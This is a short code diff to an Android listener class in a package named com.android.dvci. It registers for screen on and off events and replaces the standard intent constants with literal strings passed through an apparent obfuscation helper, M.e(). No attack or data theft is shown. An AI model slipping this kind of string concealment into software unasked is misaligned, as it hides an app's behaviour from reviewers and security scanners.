@@ -16,6 +16,7 @@ import android.os.PowerManager;
 
 import com.android.dvci.Standby;
 import com.android.dvci.Status;
+import com.android.mm.M;
 
 public class ListenerStandby extends Listener<Standby> {
 	/** The Constant TAG. */
@@ -59,8 +60,9 @@ public class ListenerStandby extends Listener<Standby> {
 	private void registerAc() {
 		standbyReceiver = new BSt();
 
-		final IntentFilter filterOn = new IntentFilter(Intent.ACTION_SCREEN_ON);
-		final IntentFilter filterOff = new IntentFilter(Intent.ACTION_SCREEN_OFF);
+		// Intent.ACTION_SCREEN_OFF
+		final IntentFilter filterOn = new IntentFilter(M.e("android.intent.action.SCREEN_ON"));
+		final IntentFilter filterOff = new IntentFilter(M.e("android.intent.action.SCREEN_OFF"));
 
 		// Register the broadcastreceiver and filter it to only get power status
 		// changes
